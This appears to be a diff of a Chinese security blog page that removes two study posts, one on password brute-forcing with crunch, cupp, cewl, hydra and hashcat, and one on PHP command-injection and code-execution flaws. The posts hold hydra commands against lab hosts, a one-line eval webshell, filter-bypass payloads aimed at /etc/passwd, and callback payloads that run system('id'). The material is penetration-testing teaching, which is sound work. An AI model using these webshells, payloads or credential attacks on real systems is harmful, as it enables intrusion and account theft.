@@ -122,7 +122,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">笔记</span>
         </a>
       </div>
@@ -154,7 +154,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/23/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
@@ -172,593 +172,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/11/23/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="post-title-link" itemprop="url">暴力破解</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-11-23 16:28:59 / 修改时间：17:17:53" itemprop="dateCreated datePublished" datetime="2024-11-23T16:28:59+08:00">2024-11-23</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="BP"><a href="#BP" class="headerlink" title="BP"></a>BP</h2><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p>在kail中是自带字典的，可以通过&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb路径进行查看，当然都是txt文件，也可以自己向里面添加</p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A31.jpg" alt="1"></p>
-<h3 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h3><p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A32.jpg" alt="2"></p>
-<h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><p>crunch <min-len>  <max-len>  [<charset string>] [options]</p>
-<blockquote>
-<p>min-len 最小长度字符串，即使不使用参数的值，也需要此选项</p>
-<p>max-len 最大长度字符串，即使不使用参数的值，也需要此选项</p>
-<p>charset string 字符集设置，默认是小写字符集</p>
-</blockquote>
-<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>-b     指定文件输出的大小，避免字典文件过大<br>-c     指定文件输出的行数，即包含密码的个数<br>-d     限制相同元素出现的次数<br>-e     定义停止字符，即到该字符串就停止生成<br>-f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）<br>-i     改变输出格式，即aaa,aab -&gt; aaa,baa<br>-I     通常与-t联合使用，表明该字符为实义字符<br>-m     通常与-p搭配<br>-o     将密码保存到指定文件<br>-p     指定元素以组合的方式进行<br>-q     读取密码文件，即读取pass.txt<br>-r     定义重某一字符串重新开始<br>-s     指定一个开始的字符，即从自己定义的密码xxxx开始<br>-t     指定密码输出的格式<br>-u     禁止打印百分比（必须为最后一个选项）<br>-z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z </p>
-<blockquote>
-<p>特殊字符，通常与-t配合使用</p>
-<p>%   代表数字<br>^   代表特殊符号<br>@   代表小写字符<br>,   代表大写字符</p>
-</blockquote>
-<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>crunch 6 6 123 -o number.txt  &#x2F;&#x2F;生成六位以123元素为组合的字典集，并输出到number.txt</p>
-<p>crunch 1 1 -q read  &#x2F;&#x2F;读取read文件中每行内容作为基本字符生成字典</p>
-<p>crunch 4 4 -t %^@, &#x2F;&#x2F;生成长度四位的字典集，第一位为数字，第二位为特殊字符，第三位是小写字符，第四位是大写字符</p>
-<p>crunch 4 4 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst mixalpha-numeric -o w.txt -s 1a2b  &#x2F;&#x2F;以charset.lst密码库的mixalpha-numeric模块为字符集，以1a1b为开始字符，生成长度为四的字典集，输出到w.txt</p>
-<h3 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install cupp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A33.jpg" alt="3"></p>
-<h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><p>-h                 常看帮助信息</p>
-<p>-i                  通过填写信息创建用户密码字典</p>
-<p>-w                在已存在的字典进行扩展</p>
-<p>-l                  从github仓库下载字典</p>
-<p>-v                 查看版本信息</p>
-<p>-q                 安静模式</p>
-<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p> 1.运行命令”cupp -i”,填写受害人姓、名、绰号、生日。</p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A34.jpg" alt="4"></p>
-<p>2.填写受害人配偶的名字、绰号、生日</p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A35.jpg" alt="5"></p>
-<p>3.填写孩子的名字、绰号、生日</p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A36.jpg" alt="6"></p>
-<p>4.填写宠物的名字以及公司的名字</p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A37.jpg" alt="7"></p>
-<p>5.是否添加一些关于受害人的关键词</p>
-<p>6.是否在密码结尾添加一些特殊字符</p>
-<p>7是否在密码结尾添加一些随机数字</p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A38.jpg" alt="8"></p>
-<p>8.填写”y”，生成字典，可以在root目录下查看</p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A39.jpg" alt="9"></p>
-<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A310.jpg" alt="10"></p>
-<h4 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h4><p>cewl（其他参数见cewl –help）</p>
-<p>-m：最小单词长度</p>
-<p>-d：爬网深度（首页远远不够，几层页面均收集）</p>
-<p>-e：收集包含email地址信息</p>
-<p>-c：每个单词出现次数</p>
-<p>-w：保存文件</p>
-<p>实例</p>
-<p>对指定网站深度收集信息并生成字典（可指定深度）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://www.baidu.com/ -w dict.txt</span><br></pre></td></tr></table></figure>
-
-<p>生成指定长度的字典如果你想生成指定单词长度的字典，你可以使用-m参数，这个参数的意思是指定最小的单词长度：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://www.baidu.com/ -m 9</span><br></pre></td></tr></table></figure>
-
-<p>计算网站中单词重复的次数如果你想统计网站中重复出现好几次的单词的数量，你可以使用-c参数来计数</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://www.baidu.com/ -c</span><br></pre></td></tr></table></figure>
-
-<p>增加爬行深度如果你想增加爬行等级，来遍历网站中更多的单词来生成更大的字典，你可以使用-d参数，并指定一个爬行深度等级来进行更加深入的爬行，默认等级是2</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://www.baidu.com/ -d 3</span><br></pre></td></tr></table></figure>
-
-<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><p>-h	查看帮助菜单。<br>-R	继续从上一次进度接着破解。<br>-S	采用SSL链接。<br>-s	PORT 可通过这个参数指定非默认端口。<br>-l	LOGIN 指定破解的用户，对特定用户破解。<br>-L	FILE 指定用户名字典。<br>-p	PASS 小写，指定密码破解，少用，一般是采用密码字典。<br>-P	FILE 大写，指定密码字典。<br>-e	ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。<br>-C	FILE 使用冒号分割格式，例如“登录名:密码”来代替-L&#x2F;-P参数。<br>-M	FILE 指定目标列表文件一行一条。<br>-o	FILE 指定结果输出文件。<br>-f	在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。<br>-t	TASKS 同时运行的线程数，默认为16。<br>-w	TIME 设置最大超时的时间，单位秒，默认是30s。<br>-v&#x2F;-V	显示详细过程。<br>-x -h	密码生成器帮助</p>
-<h4 id="SSH协议爆破"><a href="#SSH协议爆破" class="headerlink" title="SSH协议爆破"></a>SSH协议爆破</h4><p>finalshell连接服务器</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt 被攻击IP ssh</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A311.jpg" alt="11"></p>
-<p>如果知道账号比如root:hydra -l root -P password.txt 被攻击IP ssh</p>
-<h4 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt 192.168.150.129 smb</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A312.jpg" alt="12"></p>
-<h4 id="远程桌面（RDP）爆破"><a href="#远程桌面（RDP）爆破" class="headerlink" title="远程桌面（RDP）爆破"></a>远程桌面（RDP）爆破</h4><p>确认靶机开启远程桌面</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt rdp://192.168.150.129</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A313.jpg" alt="13"></p>
-<h4 id="HTTP协议爆破"><a href="#HTTP协议爆破" class="headerlink" title="HTTP协议爆破"></a>HTTP协议爆破</h4><h5 id="POST方式爆破"><a href="#POST方式爆破" class="headerlink" title="POST方式爆破"></a>POST方式爆破</h5><h5 id="GET方式爆破"><a href="#GET方式爆破" class="headerlink" title="GET方式爆破"></a>GET方式爆破</h5><h4 id="FTP协议爆破"><a href="#FTP协议爆破" class="headerlink" title="FTP协议爆破"></a>FTP协议爆破</h4><h5 id="安装vsftpd"><a href="#安装vsftpd" class="headerlink" title="安装vsftpd"></a>安装vsftpd</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vsftpd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/vsftpd.conf</span><br></pre></td></tr></table></figure>
-
-<p>（本地用户访问：如果希望允许本地用户通过FTP访问，请确认以下行没有被注释掉，并将其设置为”YES”：</p>
-<p>local_enable&#x3D;YES）</p>
-<h5 id="启动vsftpd"><a href="#启动vsftpd" class="headerlink" title="启动vsftpd"></a>启动vsftpd</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service vsftpd start</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser &lt;用户名&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt 192.168.150.128 ftp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A314.jpg" alt="14"></p>
-<h4 id="数据库爆破"><a href="#数据库爆破" class="headerlink" title="数据库爆破"></a>数据库爆破</h4><h5 id="windows下的操作"><a href="#windows下的操作" class="headerlink" title="windows下的操作"></a>windows下的操作</h5><h6 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h6><p>win+R打开cmd，登陆mysql：<code>mysql -uroot -p</code></p>
-<p>选择数据库、查看user表：<code>use mysql</code><br>                                               <code>select host,user from user;</code></p>
-<p>赋予权限：root指用户名，%表示所有ip地址，123456是访问的密码</p>
-<p><code>grant all privileges on *.*  to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</code></p>
-<p>只适用于mysql8.0之前的版本<br>之后采用这句:</p>
-<p><code>create user root@&#39;%&#39; identified by &#39;123456&#39;;</code><br><code>grant all privileges on *.* to root@&#39;%&#39; with grant option;</code></p>
-<p>刷新权限：<code>flush privileges;</code></p>
-<p>查看user表，可以看到成功添加了用户：<code>select host,user from user;</code></p>
-<p>重启数据库</p>
-<h5 id="kali下的操作"><a href="#kali下的操作" class="headerlink" title="kali下的操作"></a>kali下的操作</h5><p>修改&#x2F;etc&#x2F;mysql&#x2F;mariadb.conf.d&#x2F;50-server.cnf：<code>vim /etc/mysql/mariadb.conf.d/50-server.cnf</code></p>
-<p>将bind-adress &#x3D; 127.0.0.1这一行注释</p>
-<p>Kali mysql远程登陆：<code>mysql -h 192.168.43.61 -uroot -p</code></p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A315.jpg" alt="15"></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwd.txt 192.168.150.129 mysql</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A316.jpg" alt="16"></p>
-<h3 id="Ziperello"><a href="#Ziperello" class="headerlink" title="Ziperello"></a>Ziperello</h3><h3 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h3><h3 id="Passper-for-word"><a href="#Passper-for-word" class="headerlink" title="Passper for word"></a>Passper for word</h3><h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h3><h4 id="常用命令-3"><a href="#常用命令-3" class="headerlink" title="常用命令"></a>常用命令</h4><p>-m                           指定哈希类型</p>
-<p>-a                            指定破解模式</p>
-<p>-V                            查看版本信息</p>
-<p>-o                            将输出结果储存到指定文件</p>
-<p>–force                     忽略警告</p>
-<p>–show                    仅显示破解的hash密码和对应的明文</p>
-<p>–remove                 从源文件中删除破解成功的hash</p>
-<p>–username             忽略hash表中的用户名</p>
-<p>-b                             测试计算机破解速度和相关硬件信息</p>
-<p>-O                            限制密码长度</p>
-<p>-T                            设置线程数</p>
-<p>-r                             使用规则文件</p>
-<p>-1                             自定义字符集  -1 0123asd     ?1&#x3D;{0123asd}</p>
-<p>-2                             自定义字符集  -2 0123asd    ?2&#x3D;{0123asd}</p>
-<p>-3                             自定义字符集  -3 0123asd    ?3&#x3D;{0123asd}</p>
-<p>-i                              启用增量破解模式</p>
-<p>–increment-min       设置密码最小长度</p>
-<p>–increment-max      设置密码最大长度</p>
-<p>hashcat -a 0 -m 0 ffe1cb31eb084cd7a8dd1228c23617c8 &#x2F;home&#x2F;kali&#x2F;password.txt</p>
-<p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A317.jpg" alt="17"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-<div>
-  
-</div>
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/23/Command-Injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
-      <meta itemprop="name" content="Xorb_7">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xorb_7's Blog">
-      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Xorb_7's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/11/23/Command-Injection/" class="post-title-link" itemprop="url">Command_Injection&Code_execution</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-11-23 14:46:18 / 修改时间：15:47:13" itemprop="dateCreated datePublished" datetime="2024-11-23T14:46:18+08:00">2024-11-23</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><blockquote>
-<p><strong>原理：在对可以输入数据的地方，输入恶意命令，网站未对其进行过滤，从而可以执行命令</strong></p>
-</blockquote>
-<h2 id="php语言常见命令执行函数和运算符"><a href="#php语言常见命令执行函数和运算符" class="headerlink" title="php语言常见命令执行函数和运算符"></a><strong>php语言常见命令执行函数和运算符</strong></h2><ul>
-<li><p>system()</p>
-<p>用于执行外部程序，并显示输出</p>
-</li>
-<li><p>exec(）</p>
-<p>用于执行一个外部程序</p>
-</li>
-<li><p>shell_exec()</p>
-<p>通过shell环境执行命令，并且将完整输出以字符串的方式返回（需加上echo函数）</p>
-</li>
-<li><p>passthru()</p>
-<p>用于执行外部程序，并显示原始输出</p>
-</li>
-<li><p>popen()</p>
-<p>用于打开进程文件指针</p>
-</li>
-<li><p>proc_open()</p>
-<p>用于执行一个命令，并打开用来输入输出的文件指针</p>
-</li>
-<li><p>&#96;(反单引号)</p>
-<p>PHP执行运算符，PHP将尝试反单引号的内容作为shell命令执行，并输出信息返回</p>
-</li>
-</ul>
-<h2 id="Windows下的命令执行漏洞"><a href="#Windows下的命令执行漏洞" class="headerlink" title="Windows下的命令执行漏洞"></a>Windows下的命令执行漏洞</h2><p><strong>Windows下的命令连接符</strong><br> &amp;   ：&#x2F;&#x2F;命令前面的语句为假，则直接执行后面的；前面的语句为真，命令都执行</p>
-<p>&amp;&amp; ：&#x2F;&#x2F;前面的语句为假，则直接出错，后面的也不执行；前面为真，都执行</p>
-<p>|     ：&#x2F;&#x2F;前面命令正确，直接执行后面的语句；前面的语句为假，则直接出错，后面的也不执行</p>
-<p>||   ：&#x2F;&#x2F;前面出错，执行后面的；前面为真，只执行前面的</p>
-<p><strong>Windows下的命令执行漏洞利用</strong></p>
-<p>代码中调用了system函数执行ping命令，正常输入?ip&#x3D;127.0.0.1，会返回ping 127.0.0.1的结果</p>
-<p>$ip是可控参数，可以通过Windows下的命令连接符执行多条命令，dir&#x2F;whoami&#x2F;net user&#x2F;document.cookie等，达到攻击的目的。</p>
-<h2 id="Linux下的命令执行漏洞"><a href="#Linux下的命令执行漏洞" class="headerlink" title="Linux下的命令执行漏洞"></a>Linux下的命令执行漏洞</h2><p><strong>Linux下的命令连接符</strong></p>
-<p> ;   ：&#x2F;&#x2F;使多个命令顺序执行，前面命令和后面命令的都会执行。</p>
-<p>&amp;   ：&#x2F;&#x2F;命令前面的语句为假，则直接执行后面的；前面的语句为真，命令都执行</p>
-<p>&amp;&amp; ：&#x2F;&#x2F;前面的语句为假，则直接出错，后面的也不执行；前面为真，都执行</p>
-<p>|     ：&#x2F;&#x2F;将第一个命令的输出作为第二个命令的输入，前面跟后面的都会执行，不论报错都显示后面的执行结果</p>
-<p>||   ：&#x2F;&#x2F;前面的命令执行成功后面的命令不会执行，前面的命令执行失败后面的命令会执行</p>
-<p><strong>Linux下的命令执行漏洞利用</strong></p>
-<p>代码中调用了system函数执行ping命令，正常输入?ip&#x3D;127.0.0.1，会返回ping 127.0.0.1的结果</p>
-<p>$ip是可控参数，可以通过Linux下的命令连接符执行多条命令，ls&#x2F;whoami&#x2F;net user&#x2F;document.cookie等，达到攻击的目的。</p>
-<h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><p>1.${IFS}绕过 (cat ${IFS} xxx)</p>
-<p>2.$IFS$9绕过 (cat $IFS$9 xxx)</p>
-<p>3.制表符绕过%09 (cat %09 xxx)</p>
-<p>4.{}绕过 ({cat xxx})</p>
-<p>5.&lt;绕过(cat &lt; xxx)</p>
-<h3 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h3><p>1.变量拼接绕过</p>
-<p>2.空变量绕过</p>
-<p>3.系统变量绕过</p>
-<p>4.\绕过 (c\a\t xxx)</p>
-<p>5.通配符绕过 (*代表多个任意字符；?代表一个任意字符；[]代表该范围中任意一个字符)</p>
-<p>​    &#x2F;etc&#x2F;passwd文件过滤，可利用&#x2F;???&#x2F;???sw?绕过</p>
-<p>6.shell反弹绕过</p>
-<p>7.Base64编码绕过</p>
-<p>8.expr和awk绕过</p>
-<p>9.无回显的命令执行</p>
-<p>​    可通过shell反弹方式将shell反弹到vps上，通过vps执行命令。如果无法反弹shell，也可通过DNS管道解析方式获取命令执行结果</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><h3 id="PHP配置文件禁用敏感函数"><a href="#PHP配置文件禁用敏感函数" class="headerlink" title="PHP配置文件禁用敏感函数"></a>PHP配置文件禁用敏感函数</h3><p>通过php配置文件中的disable_functions禁用敏感函数。</p>
-<h3 id="使用相关过滤函数处理相关参数"><a href="#使用相关过滤函数处理相关参数" class="headerlink" title="使用相关过滤函数处理相关参数"></a>使用相关过滤函数处理相关参数</h3><p>1.escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，过滤命令中的参数。</p>
-<p>2.escapeshellarg函数 — shell 元字符转义，过滤命令。</p>
-<h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><blockquote>
-<p><strong>原理：有的应用程序中提供了一些可以将字符串作为代码执行的函数，例如PHP中的eval函数，可以将该函数中的参数当作PHP代码来执行。如果对这些函数的参数控制不严格，就可能会被攻击者利用，执行恶意代码</strong></p>
-</blockquote>
-<h2 id="常见代码执行函数"><a href="#常见代码执行函数" class="headerlink" title="常见代码执行函数"></a>常见代码执行函数</h2><p><strong>eval()函数</strong></p>
-<p>eval函数把字符串作为PHP代码执行。一般用于写入一句话木马。如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">pwd = <span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
-
-<p><strong>assert函数</strong></p>
-<p>assert函数检查一个断言是否为FALSE</p>
-<p>assert函数会检查指定的assertion并在结果为FALSE时采取适当的行动。如果assertion是字符串，它会被assert函数当作PHP代码来执行。如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1</span> = <span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
-
-<p><strong>call_user_func函数</strong></p>
-<p>call_user_func函数把第一个参数作为回调函数调用</p>
-<p>第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。call_user_func函数示例代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">fun = system &amp; arg = id</span><br></pre></td></tr></table></figure>
-
-<p>通过POST型fun参数调用了system函数，arg参数传入id命令，执行system(‘id’)，返回当前用户信息</p>
-<p><strong>call_user_func_array函数</strong></p>
-<p>call_user_func_array函数把第一个参数作为回调函数调用,把参数数组作为回调函数的参数传入。call_user_func_array函数示例代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">fun = system &amp; arg = id</span><br></pre></td></tr></table></figure>
-
-<p>通过POST型fun参数调用了system函数，arg参数传入id命令，执行system(‘id’)，返回当前用户信息</p>
-<p><strong>create_function函数</strong></p>
-<p>create_function函数根据传递的参数创建匿名函数，并为该匿名函数返回唯一名称，create_function函数示例代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$func</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;func&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">转换为</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"><span class="variable">$func</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?id = <span class="number">1</span>;)<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>array_map函数</strong></p>
-<p>array_map函数为数组的每个元素应用回调函数</p>
-<p>array_map函数返回为每个数组元素应用callback函数之后的数组。array_map函数示例代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$argv</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$argv</span>;</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">func = system&amp;argv = id</span><br></pre></td></tr></table></figure>
-
-<p><strong>preg_replace函数</strong></p>
-<p>preg_replace函数执行一个正则表达式的搜索和替换</p>
-<p>preg_replace函数搜索subject中匹配pattern的部分，以replacement进行替换。preg_replace函数示例代码如下：</p>
